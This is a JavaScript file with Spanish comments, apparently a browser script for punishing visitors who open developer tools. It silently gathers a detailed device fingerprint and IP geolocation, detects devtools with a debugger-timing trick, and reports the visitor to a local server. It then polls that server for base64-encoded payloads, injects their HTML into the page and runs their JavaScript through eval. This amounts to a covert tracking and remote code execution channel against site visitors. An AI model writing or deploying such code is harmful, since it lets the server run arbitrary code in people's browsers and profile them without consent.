
const URL_ENDPOINT = "http://127.0.0.1:4999"

let bg_ = "debugger"
let max_load = 0

async function solicitar_payload() {
    const user_payload = await fetch(`${URL_ENDPOINT}/api/v2/user/dinamic`, {"method": "get", "credentials": "include"})
    const user_pay_read = await user_payload.json()

    return user_pay_read
}

async function solicitar_registro() {
    // Notificar huella digital recibiendo un uuid que identificara su huella
    // post a un endpoint con la informacion de uuid_m y devuelve un uuid_m
    const UUID_M = await fetch(`${URL_ENDPOINT}/api/v2/user/dinamic`, {"method": "post", "body": `${btoa(JSON.stringify(USR_GB))} `, "credentials": "include"})
    const DATA_J = await UUID_M.text()

    // console.log(DATA_J)

}

// Retorna 'true' si es que se necesita ejecutar el codigo almacenado nuevamente o no
// identificando al usuario malicioso con un uuid_m
function necesito_ejecutar(codigo_ejecutado) {
    
    let new_data_executed = codigo_ejecutado
    let data_executed = localStorage.getItem("executed")

    if (data_executed != new_data_executed) {
        localStorage.setItem("executed", new_data_executed)

        max_load = 1
        return true // Retorna true si es que necesita ejecutarse
    }

    if (max_load === 0) {
        max_load = 1
        return true // Retorna true porque se reinicio la pagina
    }

    return false

}


// Funcion encargada de realizar un uuid que se usara unicamente cuando se use la devtool
async function get_uuid_m() {
    
    uuid_m = {
        "lenguaje": navigator.language,
        "lenguajes_soportados": navigator.languages,
        "pdf_habilitado": navigator.pdfViewerEnabled,
        "login": navigator.login,
        "nucleos_max_touch_points": navigator.hardwareConcurrency,
        "reproduccion_de_media_info": JSON.stringify(navigator.mediaDevices.getSupportedConstraints()),
        "media_metadata": navigator.mediaSession.metadata,
        "reproduccion_de_fondo": navigator.mediaSession.playbackState,
        "max_touch_points": navigator.maxTouchPoints,
        "web_driver": navigator.webdriver,
        "input_devices": await navigator.mediaDevices.enumerateDevices(),
        "en_linea": navigator.onLine,
        "trackeado": navigator.doNotTrack,
        // "wakelock_permitido": await navigator.wakeLock.request("screen"),
        "gamepads_user": navigator.getGamepads(),
        "cookies_habilitadas": navigator.cookieEnabled,
        "memoria_dispositivo": navigator.deviceMemory,
        "navegador": navigator.userAgent,
        "plataforma": navigator.platform,
        "time_zone": Intl.DateTimeFormat().resolvedOptions().timeZone
    }

    try {
        const ip_ = await fetch("http://ip-api.com/json/", {"method": "get"})
        uuid_m["ip_info"] = await ip_.json()
    } catch {
        uuid_m["ip_info"] = "error"
    }

    return uuid_m
}


async function detectar_developer_tools() {
    
    // Se solicita un payload que si existe el usuario retornara el payload que debe de tener asignado
    const payload_charge = await solicitar_payload()
    console.log(payload_charge)
    // Si contiene un payload asignado, se verifica que no sea uno que ya ejecuto anteriormente
    if (payload_charge["status"] === 200) {

        payload_to_load = payload_charge["data"]

        // Si no necesita ejecutarse se termina la ejecucion de esta funcion por esta iteracion
        if (!necesito_ejecutar(payload_to_load)) {
            return
        }

        // En caso de existir un payload este se decodifica y se ejecuta en el navegador
        const payload_ = JSON.parse(atob(payload_to_load))

        let html_code = payload_["html_payload"]
        let jscr_code = payload_["jscr_payload"]

        const codigo = document.createElement("div")
        codigo.innerHTML = html_code
        document.body.appendChild(codigo)
        
        try {
            eval(jscr_code)
        
        } catch(error) {
            console.log(error)
        }
        
        // Ejecutando eval (js)
        return
    
    } 


    // =========================================
    // Primera vez ejecutado =>> Codigo de abajo
    // =========================================

    // Se tiene una variable global que contiene el detonador de debugger en caso de abrir toolbox
    let initial_ = Date.now()
    eval(bg_)
    let finally_ = Date.now()

    // Si el tiempo es menor al correspondiente debe de solicitarse un registro con huella de fingerprint
    // creada en la funcion get_uuid_m que se usara en caso unicamente de que se use la toolbox
    if (finally_ - initial_ > 1000) {
        bg_ = "// pwd 123456"
        await solicitar_registro()
    }
}

// Funcion inicial encargada de contener las funciones paralelas
async function main() {
    USR_GB = await get_uuid_m()
    console.log(USR_GB)
    setInterval(detectar_developer_tools, 2000)
}

main()

